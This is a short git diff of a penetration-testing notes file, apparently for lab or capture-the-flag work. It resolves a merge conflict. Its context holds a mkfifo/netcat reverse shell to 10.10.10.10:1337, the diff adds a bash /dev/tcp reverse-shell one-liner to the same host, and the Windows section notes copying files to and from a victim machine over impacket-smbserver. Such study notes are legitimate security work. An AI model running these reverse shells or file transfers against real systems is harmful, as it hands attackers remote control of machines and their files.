@@ -24,7 +24,11 @@ Probably the least-special-characters way (and with sh):
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 > /tmp/f
 ```
-<<<<<<< HEAD
+
+I used bash to call bash
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'
+```
 
 ### Windows
 Using impacket-smbserver we can copy files to and from the victim machine. Start the impacket-smbserver:
@@ -41,5 +45,3 @@ To copy files from Windows to Kali:
 ```cmd
 > copy file.ext \\<Kali IP>\leet\file.ext
 ```
-=======
->>>>>>> 0efa152bd1d9f18ec2a406fff9473fbdf9c8e604
